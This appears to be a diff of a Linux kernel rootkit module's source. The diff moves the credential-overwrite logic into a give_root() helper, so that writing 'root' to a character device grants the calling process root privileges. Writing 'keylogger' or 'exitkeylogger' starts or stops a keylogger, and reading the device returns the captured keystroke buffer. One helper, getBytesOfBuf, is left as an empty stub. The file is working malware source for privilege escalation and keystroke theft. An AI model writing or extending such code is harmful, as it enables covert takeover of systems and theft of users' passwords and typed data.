@@ -146,25 +146,52 @@ static int dev_open (struct inode *inode, struct file *f)
 // called each time data is sent from the device to user space
 static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 {
-  static char  message[] = "Hello, this is a message from the kernel\n";
+  //static char  message[] = "Hello, this is a message from the kernel\n";
   int error_count = 0;
 
 	printk ("Device read\n");
 
    // copy_to_user has the format ( * to, *from, size) and returns 0 on success
-   //error_count = copy_to_user(buf, keys_buf, (int)sizeof(keys_buf));
-   //simple_read_from_buffer(buf, len, off, message, (int)sizeof(message));
-  // error_count = copy_to_user(buf, keys_buf+buf_pos,10) ;
+   // error_count = copy_to_user(buf, keys_buf, sizeof(keys_buf));
+   error_count = copy_to_user(buf, keys_buf, sizeof(keys_buf));
 
    if (error_count==0){
-      printk(KERN_INFO "User read %d characters\n", (int)sizeof(message));
-      return (sizeof(message));
+      printk(KERN_INFO "User read %d characters\n", (int)sizeof(keys_buf));
+      return (sizeof(keys_buf));
    }
    else {
       printk(KERN_INFO "EBBChar: Failed to send %d characters to the user\n", error_count);
       return -EFAULT;
    }
   return len;
+}
+
+static int give_root(void)
+{
+  struct cred *new_cred;
+
+  // changes old creds to root
+  if ((new_cred = prepare_creds ()) == NULL)					// gets current creds
+  {
+    printk ("Cannot prepare credentials\n");
+    return -1;
+  }
+  V(new_cred->uid) = V(new_cred->gid) =  0;					// changes creds. uid -> 0
+  V(new_cred->euid) = V(new_cred->egid) = 0;
+  V(new_cred->suid) = V(new_cred->sgid) = 0;
+  V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
+  commit_creds (new_cred);		// saves creds
+  return 0;
+}
+
+bool compareBufs(const char *a, const char *b, const size_t len)
+{
+  return memcmp(a, b, len) == 0;
+}
+
+char * getBytesOfBuf(const char *buf, const size_t len)
+{
+
 }
 
 // called each time data is sent from user space to the device
@@ -175,35 +202,21 @@ static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 // it will change the user's id to root
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
-  static char pass[] = "root";
-  static char logger[] = "keylogger";
-  static char exitlogger[] = "exitkeylogger";
-  struct cred *new_cred;
-  //int buflen = 0;
+	printk ("Device write. Buffer length: %lu\n", len-1);
 
-	printk ("Device write\n");
-
-	if (memcmp(buf, pass, (int)sizeof(pass)-1) == 0)     	// compares data and magic
+	if (compareBufs(buf, "root", len-1))
 	{
-		// changes old creds to root
-		if ((new_cred = prepare_creds ()) == NULL)					// gets current creds
-		{
-			printk ("Cannot prepare credentials\n");
-			return 0;
-		}
-		printk ("You got root!\n");
-		V(new_cred->uid) = V(new_cred->gid) =  0;					// changes creds. uid -> 0
-		V(new_cred->euid) = V(new_cred->egid) = 0;
-		V(new_cred->suid) = V(new_cred->sgid) = 0;
-		V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
-		commit_creds (new_cred);													// saves creds
+    if(!give_root())
+    {
+      printk("You got root!\n");
+    }
 	}
-	else if(memcmp(buf, logger, (int)sizeof(logger)-1) == 0)
+	else if(compareBufs(buf, "keylogger", len-1))
 	{
 		printk("Keylogger: activated\n");
 		run_keylogger();
 	}
-	else if(memcmp(buf, exitlogger, (int)sizeof(logger)-1) == 0)
+else if(compareBufs(buf, "exitkeylogger", len-1))
 	{
 		printk("Keylogger: deactivated\n");
 		exit_keylogger();
